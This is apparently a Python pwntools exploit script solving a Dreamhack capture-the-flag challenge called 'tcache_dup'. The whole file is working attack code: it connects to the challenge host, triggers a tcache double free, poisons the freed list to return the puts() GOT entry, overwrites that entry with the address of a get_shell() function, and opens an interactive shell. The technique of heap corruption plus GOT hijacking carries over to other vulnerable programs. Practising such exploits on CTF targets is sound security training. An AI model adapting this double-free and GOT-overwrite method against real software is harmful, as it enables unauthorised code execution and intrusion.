from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/tcache_dup')
else:
    r = remote('host1.dreamhack.games', 16030)

sla = r.sendlineafter
sa = r.sendafter


def Create(size, data):
    sla('> ', '1')
    sla('Size: ', str(size))
    sa('Data: ', data)


def Delete(idx):
    sla('> ', '2')
    sla('idx: ', str(idx))


puts_got = 0x601020  # GOT of puts()
get_shell = 0x400ab0  # get_shell()


Create(0x18, 'a')  # idx: 0
Delete(0)
Delete(0)

Create(0x18, p64(puts_got))
Create(0x18, 'a')
Create(0x18, p64(get_shell))  # overwrite GOT of puts() with get_shell()


r.interactive()